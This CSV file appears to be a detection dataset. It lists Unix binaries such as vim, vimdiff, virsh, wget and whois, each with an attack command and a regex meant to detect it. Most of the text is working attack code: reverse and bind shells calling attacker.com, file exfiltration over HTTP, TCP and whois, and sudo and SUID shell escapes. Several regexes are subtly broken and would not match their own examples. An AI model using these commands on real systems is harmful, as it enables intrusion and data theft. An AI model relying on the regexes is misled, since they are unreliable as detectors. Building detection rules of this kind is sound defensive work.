Name,Function,ExampleCode,Regex
view,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
view,file-upload,"export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*socket)
view,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
view,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
view,file-download,"export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
view,file-write,"view file_to_write
iDATA
^[
w!",(?i)(?:sudo\s+)?(?:\S*/)?view\s+.*)
view,file-read,view file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?view\s+.*)
view,library-load,"view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
view,suid,"./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s*\-p\s+.*/bin/sh)
view,sudo,sudo view -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*/bin/sh)
view,sudo,"sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*/bin/sh)
view,sudo,"sudo view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
view,capabilities,"./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*/bin/sh)
view,limited-suid,"./view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
vigr,suid,./vigr,(?i)(?:sudo\s+)?(?:\S*/)?vigr\s+.*)
vigr,sudo,sudo vigr,(?i)(?:sudo\s+)?(?:\S*/)?vigr\s+.*)
vim,shell,vim -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*/bin/sh)
vim,shell,vim --cmd ':set shell=/bin/sh|:shell',(?i)(?:sudo\s+)?(?:\S*/)?vim\s+.*/bin/sh)
vim,shell,"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*/bin/sh)
vim,shell,"vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vim,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
vim,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vim,non-interactive-bind-shell,"export LPORT=12345
vim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vim,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vim,file-upload,"export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*socket)
vim,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vim,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vim,file-download,"export LPORT=12345
export LFILE=file_to_save
vim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vim,file-write,"vim file_to_write
iDATA
^[
w",(?i)(?:sudo\s+)?(?:\S*/)?vim\s+.*)
vim,file-read,vim file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?vim\s+.*)
vim,library-load,"vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vim,suid,"./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s*\-p\s+.*/bin/sh)
vim,sudo,sudo vim -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*/bin/sh)
vim,sudo,"sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*/bin/sh)
vim,sudo,"sudo vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vim,capabilities,"./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*/bin/sh)
vim,limited-suid,"./vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.*)
vimdiff,shell,vimdiff -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*/bin/sh)
vimdiff,shell,"vimdiff
:set shell=/bin/sh
:shell",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+.*/bin/sh)
vimdiff,shell,"vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*/bin/sh)
vimdiff,shell,"vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vimdiff,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
vimdiff,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vimdiff,non-interactive-bind-shell,"export LPORT=12345
vimdiff -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vimdiff,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vimdiff,file-upload,"export LPORT=8888
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*socket)
vimdiff,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vimdiff,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vimdiff,file-download,"export LPORT=12345
export LFILE=file_to_save
vimdiff -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
vimdiff,file-write,"vimdiff file_to_write
iDATA
^[
w",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+.*)
vimdiff,file-read,vimdiff file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+.*)
vimdiff,library-load,"vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vimdiff,suid,"./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s*\-p\s+.*/bin/sh)
vimdiff,sudo,sudo vimdiff -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*/bin/sh)
vimdiff,sudo,"sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*/bin/sh)
vimdiff,sudo,"sudo vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vimdiff,capabilities,"./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*/bin/sh)
vimdiff,limited-suid,"./vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.*)
vipw,suid,./vipw,(?i)(?:sudo\s+)?(?:\S*/)?vipw\s+.*)
vipw,sudo,sudo vipw,(?i)(?:sudo\s+)?(?:\S*/)?vipw\s+.*)
virsh,sudo,"cat > $TF << EOF
<domain type='kvm'>
<name>x</name>
<os>
<type arch='x86_64'>hvm</type>
</os>
<memory unit='KiB'>1</memory>
<devices>
<interface type='ethernet'>
<script path='$SCRIPT'/>
</interface>
</devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x",(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-c\s+.*)
virsh,file-write,"echo 'data' > data_to_write
TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
<name>y</name>
<key>$LFILE_DIR/$LFILE_NAME</key>
<source>
</source>
<capacity unit='bytes'>5</capacity>
<allocation unit='bytes'>4096</allocation>
<physical unit='bytes'>5</physical>
<target>
<path>$LFILE_DIR/$LFILE_NAME</path>
<format type='raw'/>
<permissions>
<mode>0600</mode>
<owner>0</owner>
<group>0</group>
</permissions>
</target>
</volume>
EOF
virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x",(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-c\s*\-c\s*\-c\s+.*)
virsh,file-read,"virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x",(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-c\s*\-c\s+.*)
volatility,shell,"volatility -f file.dump volshell
__import__('os').system('/bin/sh')","(?i)(?:sudo\s+)?(?:\S*/)?volatility\s*\-f\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
w3m,file-read,"w3m ""$LFILE"" -dump",(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+.*)
w3m,suid,"./w3m ""$LFILE"" -dump",(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+.*)
w3m,sudo,"sudo w3m ""$LFILE"" -dump",(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+.*)
wall,sudo,"sudo wall --nobanner ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?wall\s+.*)
watch,shell,watch -x sh -c 'reset; exec sh 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-c\s+.*)
watch,suid,./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-p\s*\-c\s*\-p\s+.*)
watch,sudo,sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-c\s+.*)
watch,limited-suid,./watch 'reset; exec sh 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?watch\s+.*)
wc,file-read,"wc --files0-from ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?wc\s+.*)
wc,suid,"./wc --files0-from ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?wc\s+.*)
wc,sudo,"sudo wc --files0-from ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?wc\s+.*)
wget,shell,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0",(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s+.*/bin/sh)
wget,file-upload,wget --post-file=$LFILE $URL,(?i)(?:sudo\s+)?(?:\S*/)?wget\s+.*)
wget,file-read,wget -i $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-i\s+.*)
wget,file-write,"echo DATA > $TF
wget -i $TF -o $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-i\s*\-o\s+.*)
wget,file-download,wget $URL -O $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-O\s+.*)
wget,suid,"chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0",(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s*\-p\s*\-p\s+.*/bin/sh)
wget,sudo,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0",(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s+.*/bin/sh)
whiptail,file-read,"whiptail --textbox --scrolltext ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s+.*)
whiptail,suid,"./whiptail --textbox --scrolltext ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s+.*)
whiptail,sudo,"sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s+.*)
whois,file-upload,"whois -h $RHOST -p $RPORT ""`cat $LFILE`""",(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+.*)
whois,file-upload,"whois -h $RHOST -p $RPORT ""`base64 $LFILE`""",(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+.*)
whois,file-download,"whois -h $RHOST -p $RPORT > ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+.*)
whois,file-download,"whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s*\-d\s+.*)
wireshark,command,wireshark,(?i)(?:sudo\s+)?(?:\S*/)?wireshark\s+.*)
wireshark,sudo,"sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" &
echo 'DATA' | nc -u 127.127.127.127 ""$PORT""",(?i)(?:sudo\s+)?(?:\S*/)?wireshark\s*\-c\s*\-i\s*\-k\s*\-f\s*\-u\s+.*)
wish,shell,"wish
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:sudo\s+)?(?:\S*/)?wish\s+.*/bin/sh)
